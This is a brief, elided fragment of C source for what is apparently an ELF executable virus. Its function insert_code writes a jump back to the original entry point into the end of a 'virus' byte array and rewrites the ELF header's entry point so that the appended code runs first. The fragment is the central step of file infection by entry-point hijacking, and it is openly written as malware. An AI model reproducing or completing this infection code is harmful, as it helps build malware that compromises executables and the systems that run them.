...
static int insert_code(Elf64_Ehdr *ehdr)
{
	...
	*(Elf64_Word*)(virus + sizeof virus - 4) = (Elf64_Word)ehdr->e_entry - (phdr[loc].p_vaddr + phdr[loc].p_filesz + sizeof virus); //calculate jump target
	#define entryDelta 3224
	ehdr -> e_entry = phdr[loc].p_vaddr + phdr[loc].p_filesz + entryDelta; //relocate entry
